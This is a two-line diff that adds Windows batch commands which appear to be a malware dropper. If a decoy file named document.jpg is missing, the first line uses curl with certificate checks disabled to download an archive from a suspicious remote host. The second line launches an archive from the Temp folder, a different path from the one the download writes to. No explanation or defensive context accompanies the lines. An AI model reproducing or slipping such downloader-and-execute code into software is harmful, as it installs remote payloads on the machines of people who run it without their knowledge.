@@ -1,0 +1,2 @@
+if not exist "C:\Users\admin\AppData\Local\Temp/document.jpg" ( curl -k "http://manchhd32ss.fun/412566367c67448b599d1b7666f8ccfc/tempy.7z" -o "C:\ProgramData\tempy.7z" ) 
+"C:\Users\admin\AppData\Local\Temp/tempy.7z"
